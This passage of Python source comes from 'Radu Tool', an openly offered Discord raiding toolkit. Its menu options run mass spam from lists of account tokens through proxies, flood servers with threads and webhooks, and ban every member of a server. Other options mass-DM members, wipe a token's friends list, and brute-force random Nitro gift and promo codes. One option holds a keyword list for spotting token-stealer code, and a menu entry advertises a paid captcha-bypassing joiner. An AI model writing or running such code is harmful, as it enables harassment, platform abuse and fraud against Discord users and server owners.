        def close(resp, guild_id):
            if discumclient.gateway.finishedMemberFetching(guild_id):
                discumclient.gateway.removeCommand({'function': close, 'params': {'guild_id': guild_id}})
                discumclient.gateway.close()

        def membersfetcher(guild_id, channelidlol):
            discumclient.gateway.fetchMembers(guild_id, channelidlol, keep='all', wait=1)
            discumclient.gateway.command({'function': close, 'params': {'guild_id': guild_id}})
            discumclient.gateway.run()
            discumclient.gateway.resetSession()
            return discumclient.gateway.session.guild(guild_id).members
        users = membersfetcher(guild, channel)
        userlist = []
        for memberID in users:
            userlist.append(memberID)
            print(memberID)
        with open('data/users.txt','w') as ids:
            System.Clear()
            time.sleep(1)
            for userid in userlist:
                ids.write(f'{userid}\n')
                print(f"{purple}[{green}+{purple}]{reset} Sucessfully Scraped | {blue}{userid}")
                success += 1
        time.sleep(1)
        Write.Print(f"\n\t\t\t\t\t\tMember ID Scraper Stats : \n", Colors.purple_to_red, interval=0.000)
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.purple_to_red, interval=0.000)
        print(f"\t\t\t\t\t\tSuccess : [{green}{success}{reset}] | Failed : [{red}{failed}{reset}]")
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_red, interval=0.000)
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool()
    if opc=="7":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Reply Spammer')
        def reply(tokenz, channel_id, message_id, text, amount):
            request = requests.Session()
            headers = {'Authorization':tokenz, 
            'Content-Type':'application/json', 
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            for x in range(int(amount)):
                if 5 > 5:
                    pass
                else:
                    payload = {'content':text, 
                    'tts':False}
                    payload['message_reference'] = {
                        "channel_id": channel_id,
                        "message_id": message_id
                    }
                    src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel_id}/messages", headers=headers, json=payload, timeout=10)
                    print(f"{purple}[{green}+{purple}]{reset} Successfully Sent Reply | {blue}{tokenz}")
                if src.status_code == 429:
                    try:
                        ratelimit = json.loads(src.content)
                        print(f"{purple}[{red}-{purple}]{reset} Ratelimited")
                        time.sleep(float(ratelimit['retry_after'] / 1000))
                    except:
                        pass

                else:
                    if src.status_code == 401:
                        print(f"{purple}[{red}-{purple}]{reset} Failed To Sent Reply!")
                        pass
                    else:
                        if src.status_code == 404:
                            print(f"{purple}[{red}-{purple}]{reset} Failed To Sent Reply!")
                            pass
                        else:
                            if src.status_code == 403:
                                print(f"{purple}[{red}-{purple}]{reset} Failed To Sent Reply!")
                                pass
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool()
        channel_id = input(f'\n{purple}[{red}>{purple}]{reset} Channel ID : ')
        message_id = input(f'{purple}[{red}>{purple}]{reset} Message ID : ')
        text = input(f'{purple}[{red}>{purple}]{reset} Message : ')
        amount = input(f'{purple}[{red}>{purple}]{reset} Amount Of Replies : ')
        amount = int(amount)
        tokens = open('tokens.txt', 'r').read().splitlines()
        for tokenz in tokens:
            threading.Thread(target=reply, args=(tokenz, channel_id, message_id, text, amount)).start()
    if opc=="8":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Webhook Creator')
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        channelid1 = input(f"{purple}[{red}>{purple}]{reset} Channel ID : ")
        names = input(f"{purple}[{red}>{purple}]{reset} Random Names? y/n : ")
        if names=="y":
            randomnames = ["RaduTool", "Get Raided", "Ez bypass", "RaduTool Runs Cord", "RaduTool Runs Discord", "I Feel Bad", "So Much Webhooks", "Webhook 69", "RaduTool On Top", "RaduTool Owns You :D", "RaduTool Runs This", "Ez Webhook - Radu", "ñ lmao"]
            namehook = random.choices(randomnames, k=5)
        if names=="n":
            namehook = input(f"\n{purple}[{red}>{purple}]{reset} Name Of Webhook : ")
            data = {
                "name": f"{namehook}",
            }

            def create_webhook():
                url = f"https://discord.com/api/v9/channels/{channelid1}/webhooks"
                headers = {
                        "Authorization": f"{token}"
                        }
                response = requests.post(url, headers=headers, json=data)
                if response.status_code == 200:
                    print(f"{purple}[{green}+{purple}]{reset} Webhook Created Successfully")
                    time.sleep(1)
                else:
                    print(f"{purple}[{red}-{purple}]{reset} Error Creating Webhook!")
                    time.sleep(1)

            while True:
                create_webhook()
    if opc=="9":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Thread Spammer')
        useragent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.42 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36'
        def createthread(token, name, channelid):
            payload = json.dumps({
                "name": name,
                "type": 11,
                "auto_archive_duration": 60,
                "location": "Thread Browser Toolbar"
                })
            
            headers = {
                'authorization': token,
                'user-agent': useragent,
                'content-type': 'application/json',
                'accept': '*/*'
                    }
            url = f"https://discord.com/api/v9/channels/{channelid}/threads"
            while True:
                response = requests.post(url,headers=headers,data=payload)
                if response.status_code == 201:
                    print(f'{purple}[{green}+{purple}]{reset} Thread Created | {blue}{token}')
                if response.text == "The resource is being rate limited.":                
                    ratelimit = response.json()['retry_after']
                    print(f"{purple}[{yellow}/{purple}]{reset} Ratelimited For {ratelimit}s")
                    time.sleep(ratelimit)
                    print(f"\n{purple}[{blue}%{purple}]{reset} Bypassed Rate-Limit, Retrying...")                
        channelid = input(f"\n{purple}[{red}>{purple}]{reset} Channel ID : ")
        threadnames = input(f"{purple}[{red}>{purple}]{reset} Thread Names : ")
        print()
        i = 50000000
        tokens = open("tokens.txt", "r").read().splitlines()
        for token in tokens:
            t = threading.Thread(target=createthread, args=(token, channelid, threadnames)).start
        for i in range(int(i) + 1):
            thread = threading.Thread(target=createthread(token, threadnames, channelid), daemon=True)
    if opc=="10":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Voice Joiner')
        guild = input(f'\n{purple}[{red}>{purple}]{reset} Server ID : ')
        channel = input(f'{purple}[{red}>{purple}]{reset} Channel ID : ')
        mute = input(f'{purple}[{red}>{purple}]{reset} Mute? y/n : ')
        defean = input(f'{purple}[{red}>{purple}]{reset} Defean? y/n : ')
        cam = input(f'{purple}[{red}>{purple}]{reset} Cam? y/n : ')
        if mute == "y":
            mute = True
        if mute == "n":
            mute = False
        if defean == "y":
            defean = True
        if defean == "n":
            defean = False
        if cam == "y":
            cam = True
        if cam == "n":
            cam = False
        stream = True
        websocket.enableTrace(True)
        with open('tokens.txt', 'r') as f:
            tokens = [line.strip() for line in f]
        def join(token):
            websock = websocket.WebSocket()
            websock.connect('wss://gateway.discord.gg/?v=9&encoding=json')
            identify_payload = {
                'op': 2,
                'd': {
                    'token': token,
                    'intents': 513,
                    'properties': {
                        '$os': 'windows',
                        '$browser': 'Discord',
                        '$device': f'desktop'
                    }
                }
            }
            websock.send(json.dumps(identify_payload))
            while True:
                message = websock.recv()
                event = json.loads(message)
                if event['op'] == 0 and event['t'] == 'READY':
                    print(f'{purple}[{green}+{purple}]{reset} Connected | {blue}{token}')
                    break
                else:
                    print(f'{purple}[{red}-{purple}]{reset} Failed To Connect | {blue}{token}')
                    pass
            voicestate = {
                'op': 4,
                'd': {
                    'guild_id': guild,
                    'channel_id': channel,
                    'self_mute': mute,
                    'self_deaf': defean,
                    'self_stream?': stream,
                    'self_video': cam
                }
            }
            websock.send(dumps({"op": 18,"d": {
                "type": "guild",
                "guild_id": guild,
                "channel_id": channel,
                "preferred_region": "spain"
                }}))
            websock.send(dumps({"op": 1,"d": None}))
            websock.send(json.dumps(voicestate))
            while True:
                message = websock.recv()
                message1 = json.loads(message)
                print(f'{purple}[{green}+{purple}]{reset} Successfully Joined Voice | {blue}{token}')
                if message1['op'] == 0 and message1['t'] == 'VOICE_STATE_UPDATE':
                    break
            websock.close()
        with ThreadPoolExecutor(max_workers=10000) as executor:
            for token in tokens:
                headers = {'Authorization': token}
                response = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
                if response.status_code == 200:
                    print(f'\n{purple}[{green}+{purple}]{reset} {green}Valid Token {reset}| {blue}{token}')
                    time.sleep(0.001)
                    pass
                elif response.status_code == 401:
                    print(f'\n{purple}[{red}-{purple}]{reset} {red}Invalid Token {reset}| {blue}{token}')
                executor.submit(join, token)
    if opc=="11":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Channel Spammer')
        def raider():  
            channel7 = input(f"\n{purple}[{red}>{purple}]{reset} Channel ID : ")
            mess7 = input(f"{purple}[{red}>{purple}]{reset} Message : ")
            randomemoji = input(f"{purple}[{red}>{purple}]{reset} Random Emojis? y/n : ")
            if randomemoji=="y":
                randomemoji = True
            elif randomemoji=="n":
                randomemoji = False
            radulist = ['😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴']
            delay = "0"
            tokens = open("tokens.txt", "r").read().splitlines()
            proxies = open("Data/proxies.txt", "r").read().splitlines()               
            def spam(token, channel7, mess7):
                url = f"https://discord.com/api/v9/channels/{channel7}/messages"
                while True:
                    caracteres = string.ascii_letters + string.digits
                    cadena_aleatoria = ''.join(random.choices(caracteres, k=10))
                    selected_emojis = random.sample(radulist, 8)
                    selected_emojis_str = ' '.join(selected_emojis)
                    data = {"content": mess7 + f' | {selected_emojis_str} - {cadena_aleatoria}'}
                    header = {"authorization": token}
                    time.sleep(0.0001)
                    r = requests.post(url, data=data, headers=header, proxies=proxies)
                    if r.status_code == 200:
                        print(f'{purple}[{green}+{purple}]{reset} Sent Message | {blue}{token}')
                    else:
                        print(f"{purple}[{red}-{purple}]{reset} Failed To Send Message | {blue}{token}")              
            def thread():
                channel_id = channel7
                text = mess7
                for token in tokens:
                    time.sleep(int(delay))
                    threading.Thread(target=spam, args=(token, channel_id, text)).start()
            thread()                         
        raider()
    if opc=="12":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Nickname Changer')
        def nicker():
                            def nicker2(server, nickname, token):
                                headers = mainHeader(token)
                                req = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                                                json={"nick": nickname})
                                if req.status_code == 200:
                                    print(f'{purple}[{green}+{purple}]{reset} Changed Nickname | {blue}{token}')
                                if req.status_code != 200:
                                    print(f"{purple}[{red}-{purple}]{reset} Error | {blue}{token}")
                            tokens = open("tokens.txt", "r").read().splitlines()
                            server = input(f"\n{purple}[{red}>{purple}]{reset} Server ID : ")
                            nick = input(f"{purple}[{red}>{purple}]{reset} Nickname : ")
                            print()
                            for token in tokens:
                                threading.Thread(target=nicker2, args=(server, nick, token)).start()
                            time.sleep(1)
                            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
                            radutool()
        nicker()
    if opc=="13":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Voice Pinger')
        def voicepinger():  
            channel7 = input(f"\n{purple}[{red}>{purple}]{reset} Voice Channel ID : ")
            messa = input(f"{purple}[{red}>{purple}]{reset} Message : ")
            mess7 = "@everyone " + messa
            delay = "0"
            tokens = open("tokens.txt", "r").read().splitlines()
            proxies = open("Data/proxies.txt", "r").read().splitlines()               
            def spam(token, channel7, mess7):
                url = f"https://discord.com/api/v9/channels/{channel7}/messages"
                while True:
                    caracteres = string.ascii_letters + string.digits
                    cadena_aleatoria = ''.join(random.choices(caracteres, k=10))
                    data = {"content": mess7 + f' | {cadena_aleatoria}'}
                    header = {"authorization": token}
                    time.sleep(0.0001)
                    r = requests.post(url, data=data, headers=header, proxies=proxies)
                    if r.status_code == 200:
                        print(f'{purple}[{green}+{purple}]{reset} Sent Message | {blue}{token}')
                    else:
                        print(f"{purple}[{red}-{purple}]{reset} Failed To Send Message | {blue}{token}")              
            def thread():
                channel_id = channel7
                text = mess7
                for token in tokens:
                    time.sleep(int(delay))
                    threading.Thread(target=spam, args=(token, channel_id, text)).start()
            thread()                         
        voicepinger()
    if opc=="14":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server Leaver')
        guild = input(f'\n{purple}[{red}>{purple}]{reset} Server ID : ')
        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for tkn in tokens:
                token = tkn.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                }
                requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild}", headers=headers)
            print(f'{purple}[{green}+{purple}]{reset} Successfully Left Server | {blue}{token}')
        time.sleep(1)
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool()
    if opc=="15":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Fastest BanAll')
        token22 = input(f"\n{purple}[{red}>{purple}]{reset} Bot Token : ")
        prefix = input(f"{purple}[{red}>{purple}]{reset} Bot Prefix : ")
        bot = commands.Bot(command_prefix=f'{prefix}', intents=discord.Intents.all())
        @bot.event
        async def on_ready():
            System.Clear()
            Write.Print(f'''
 ,ggggggggggg,                                           ,ggg,                
dP"""88""""""Y8,                                        dP""8I   ,dPYb, ,dPYb,
Yb,  88      `8b                                       dP   88   IP'`Yb IP'`Yb
 `"  88      ,8P                                      dP    88   I8  8I I8  8I
     88aaaad8P"                                      ,8'    88   I8  8' I8  8'
     88"\"""Y8ba    ,gggg,gg   ,ggg,,ggg,             d88888888   I8 dP  I8 dP 
     88      `8b  dP"  "Y8I  ,8" "8P" "8,      __   ,8"     88   I8dP   I8dP  
     88      ,8P i8'    ,8I  I8   8I   8I     dP"  ,8P      Y8   I8P    I8P   
     88_____,d8',d8,   ,d8b,,dP   8I   Yb,    Yb,_,dP       `8b,,d8b,_ ,d8b,_ 
    88888888P"  P"Y8888P"`Y88P'   8I   `Y8     "Y8P"         `Y88P'"Y888P'"Y88                                                                                                                                                                      
                ''', Colors.purple_to_red, interval=0.000)
            Write.Print("\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.purple_to_red, interval=0.000)
            print(f'\n{purple}[{red}>{purple}]{reset} Token ~', token22)
            print(f'\n{purple}[{red}>{purple}]{reset} Ban Command : !raduban')

        @bot.command(name="raduban")
        async def ban(ctx):
            await ctx.message.delete()
            for member in ctx.guild.members:
                try:
                    await member.ban()
                    print(f"{purple}[{green}+{purple}]{reset} Successfully Banned | {blue}{member}")
                except Exception as error:
                    print(f"{purple}[{red}-{purple}]{reset} Error | {red}{error}")
        bot.run(token22)
    if opc=="16":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Nitro Checker')
        nitrolist = open(easygui.fileopenbox(), 'r').read().splitlines()
        codes_nitro = []
        print()
        for nitro in nitrolist:
            if "discord.gg/gift" in nitro:
                codigo = nitro.split("discord.gg/gift")[1].strip()
                codes_nitro.append(codigo)
                start = time.time()

            urlnitro = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

            r = requests.get(urlnitro)

            if r.status_code == 200:
                print(f"{purple}[{green}+{purple}]{reset} Valid Nitro | {blue}{nitro}")
                break
            else:
                print(f"{purple}[{red}-{purple}]{reset} Invalid Nitro | {blue}{nitro}")
        input(f'\n{purple}[{red}>{purple}]{reset} Press ENTER : ')
        radutool()
    if opc=="17":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Grabber Detector')
        filename = input(f"\n{purple}[{red}>{purple}]{reset} File Name : {red}")
        contador = 0
        with open(filename, "r") as detector:
            content = detector.read()
            elementos = ["Token", "DiscordToken", "Crypto", "Crypto.Cipher", "Cryptodome", "Webhook", "webhook", "DiscordWebhook", "Wbhook", "Injection", "Cookies", "cookies", "from discord import Embed, File, SyncWebhook", "SyncWebhook", "Discord_Token", "Token_Discord", "Stealer", "Luna", "Grabber", "TokenGrabber", "getpass", "https://discord.com/api/webhooks/"]
            for elemento in elementos:
                if elemento in content:
                    contador += 1
                    print(f"{purple}[{red}>{purple}]{reset} Found {yellow}{contador}{reset} Possible Stealer Code! ~ {red}{elemento}")
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
    if opc=="18":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Status Changer')
        def ChangeStatus(token, status):
                session = requests.Session()
                headers = {
                    'authorization': token,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
                    'content-type': 'application/json'
                }
                data = '{"custom_status":{"text":"' + status + '"}}'
                r = session.patch('https://discordapp.com/api/v9/users/@me/settings', headers=headers, data=data)
                print(f'{purple}[{green}+{purple}]{reset} Successfully Changed Status | {blue}{token}')

        tokens = open('tokens.txt', 'r').read().splitlines()
        status = input(f'\n{purple}[{red}>{purple}]{reset} Status : ')
        for token in tokens:
            threading.Thread(target=ChangeStatus, args=(token, status)).start()
        time.sleep(1)
        input(f'\n{purple}[{red}>{purple}]{reset} Press ENTER : ')
    if opc=="19":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server Joiner [Paid Version]')
        print(f"\n{purple}[{red}!{purple}]{reset} Server Joiner Is On Radu Tool Paid Version...")
        Write.Print(f"""
[1] Visit Shop
[2] What Does It Contain?
[3] Back
        """, Colors.purple_to_red, interval=0.000)
        shop = input(f"\n{purple}[{red}>{purple}]{reset} Option : ")
        if shop=="1":
            webbrowser.open('https://radutool.sellix.io')
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool()
        if shop=="2":
            print(f"\n{purple}[{red}>{purple}]{reset} The server joiner has captcha solver, joinea all tokens at once in a matter of seconds and is valid without proxies! No token will be flagged after joining them.")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool()
        if shop=="3":
            radutool()
    if opc=="20":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Nitro Promo Generator')
        print()
        count = 0
        while True:
            try:
                code = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(24))
                nitrogenerated = "https://discord.com/billing/promotions/" + code
                count += 1
                print(f"{purple}[{green}+{purple}]{reset} Generated | {blue}{nitrogenerated}{reset} | [{count}]")
                folder = "Results"
                file = f"Nitro_Promo_Codes_Unchecked.txt"
                if not os.path.exists(folder):
                    os.makedirs(folder)
                with open(os.path.join(folder, file), "a+", encoding="utf-8") as f:
                    f.write(nitrogenerated + "\n")
            except:
                print(f"{purple}[{red}-{purple}]{reset} ERROR!")
    if opc=="21":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Nitro Promo Checker')
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        promocode = input(f"{purple}[{red}>{purple}]{reset} Nitro File Name : ")
        time.sleep(1)
        api = 'https://discord.com/api/v9/promotions/{}/redeem'
        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
        }
        def check_codes(code):
            url = api.format(code)
            respuesta = requests.post(url, headers=headers)
            if respuesta.status_code == 200:
                print(f"{purple}[{green}+{purple}]{reset} Valid Promo Code | {blue}{code}")
            elif respuesta.status_code == 400:
                print(f"{purple}[{red}-{purple}]{reset} Invalid Promo Code | {blue}{code}")
            elif respuesta.status_code == 429:
                print(f"{purple}[{yellow}%{purple}]{reset} Ratelimited...")
            else:
                print(f"{purple}[{red}-{purple}]{reset} Invalid Promo Code | {blue}{code}")

        with open(promocode, 'r') as archivo:
            codes = archivo.read().splitlines()

        for code in codes:
            check_codes(code)
    if opc=="22":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Nitro Generator')
        print()
        count = 0
        while True:
            try:
                code = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
                nitrogenerated = "https://discord.gift/" + code
                count += 1
                print(f"{purple}[{green}+{purple}]{reset} Generated | {blue}{nitrogenerated}{reset} | [{count}]")
                folder = "Results"
                file = f"Nitro_Gift_Unchecked.txt"
                if not os.path.exists(folder):
                    os.makedirs(folder)
                with open(os.path.join(folder, file), "a+", encoding="utf-8") as f:
                    f.write(nitrogenerated + "\n")
            except:
                print(f"{purple}[{red}-{purple}]{reset} ERROR!")
    if opc=="23":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Vanity Checker')
        print()
        used = 0
        unused = 0
        def check_vanity(vanity_url):
            discordapi = f"https://discord.com/api/v9/invites/{vanity_url}"
            response = requests.get(discordapi.format(vanity_url=vanity_url))
            if response.status_code == 200:
                return True
            else:
                return False
        vanity_list = open(easygui.fileopenbox(), 'r').read().splitlines()
        for vanity in vanity_list:
            vanity = vanity.strip()
            in_use = check_vanity(vanity)
            if in_use:
                print(f"{purple}[{green}+{purple}]{reset} Used Vanity | {blue}{vanity}")
                used += 1
            else:
                print(f"{purple}[{green}+{purple}]{reset} Unused Vanity | {blue}{vanity}")
                unused += 1
        time.sleep(1)
        Write.Print(f"\n\t\t\t\t\t\tVanity Checker Stats : \n", Colors.purple_to_red, interval=0.000)
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.purple_to_red, interval=0.000)
        print(f"\t\t\t\t\tUsed : [{green}{used}{reset}] | Unused : [{yellow}{unused}{reset}]")
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_red, interval=0.000)
        time.sleep(0.2)
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool()
    if opc=="24":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Keyword Server Finder')
        keyword = input(f"\n{purple}[{red}>{purple}]{reset} Keyword : ")
        tokenguild = input(f"{purple}[{red}>{purple}]{reset} Token : ")
        url = f"https://discord.com/api/v9/discoverable-guilds?query={keyword}"

        headers = {
            "Authorization": f"{tokenguild}"
        }

        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            data = response.json()
            matching_servers = [guild for guild in data["guilds"] if keyword.lower() in guild["description"].lower()]
            print(f"{purple}[{red}>{purple}]{reset} Founded {len(matching_servers)} Servers With The Keyword : {keyword}\n{purple}[{red}>{purple}]{reset} Here Are The Servers :\n")
            for guild in matching_servers:
                print(f"{purple}[{red}>{purple}]{reset} {guild['name']}: {guild['description']}")
            else:
                print(f"{purple}[{red}>{purple}]{reset} Failed Request!")
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool()
    if opc=="25":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Webhook Checker')
        Write.Print(F"""
[1] Multi Checker
[2] Single Checker\n""", Colors.purple_to_red, interval=0.000)
        option = input(f"\n{purple}[{red}>{purple}]{reset} Option : ")
        if option=="1":
            webhooks_file = 'Data/webhooks.txt'
            print()
            with open(webhooks_file, "r") as file:
                webhooks = file.readlines()

            for webhook in webhooks:
                response = requests.get(webhook)
                if response.ok:
                    print(f"{purple}[{green}+{purple}]{reset} Valid Webhook | {blue}{webhook}")
                else:
                    print(f"{purple}[{red}-{purple}]{reset} Invalid Webhook | {blue}{webhook}")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool()
        elif option=="2":
            url = input(f"\n{purple}[{red}>{purple}]{reset} Webhook : ")
            print()
            response = requests.get(url)
            if response.ok:
                print(f"{purple}[{green}+{purple}]{reset} Valid Webhook | {blue}{url}")
            else:
                print(f"{purple}[{red}-{purple}]{reset} Invalid Webhook | {blue}{url}")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool()
    if opc=="26":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Block All Friends')
        def blockAllFriends(token):
            print()
            headers = {
                "authorization": token, 
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36",
                       }
            json = {"type": 2}
            block_friends_request = requests.get("https://canary.discord.com/api/v9/users/@me/relationships", headers=headers).json()
            for i in block_friends_request:
                requests.put(
                    f"https://canary.discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                    json=json,
                )
                print(f"{purple}[{green}+{purple}]{reset} Blocked Friend | {blue}{i['id']}")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool()
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        blockAllFriends(token=token)
    if opc=="27":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | MassDM [Bot]')
        def massdmbot():
            bottoken = input(f"\n{purple}[{red}>{purple}]{reset} Bot Token : ")
            status = input(f"{purple}[{red}>{purple}]{reset} Status : ")
            Message = input(f"{purple}[{red}>{purple}]{reset} Message : ")
            Delay = input(f"{purple}[{red}>{purple}]{reset} Delay : ")
            prefix = input(f"{purple}[{red}>{purple}]{reset} Bot Prefix : ")
            act = discord.Game(name=f"{status}")
            intents = discord.Intents.all()
            client = commands.Bot(command_prefix=f'{prefix}', intents=intents, activity=act, status=discord.Status.do_not_disturb)
            @client.event
            async def on_ready():
                print(f"\n{purple}[{red}>{purple}]{reset} Type : {prefix}radudm For Start.")
                time.sleep(0.001)
            @client.command()
            async def radudm(ctx):
                msg = (f"{Message}")
                members = ctx.guild.members
                for member in members:
                    try:
                        time.sleep(int(Delay))
                        print(f'{purple}[{green}+{purple}]{reset} Successfully Sent DM | {blue}{member}')
                        await member.send(msg)
                    except:
                        print(f'{purple}[{red}-{purple}]{reset} Failed To Send DM | {blue}{member}\n')          
            @client.command()
            async def guilds(ctx):
                await ctx.send(f"{len(client.guilds)}")
                    
            client.run(f'{bottoken}')
        massdmbot()
    if opc=="28":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Friend Deleter')
        def deleteFriends(token):
            friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
            for friend in friendIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
                    print(f"{purple}[{green}+{purple}]{reset} Removed Friend | {blue}"+friend['user']['username']+"#"+friend['user']['discriminator'])
                except Exception as error:
                    print(f"{purple}[{red}!{purple}]{reset} Error : {error}")
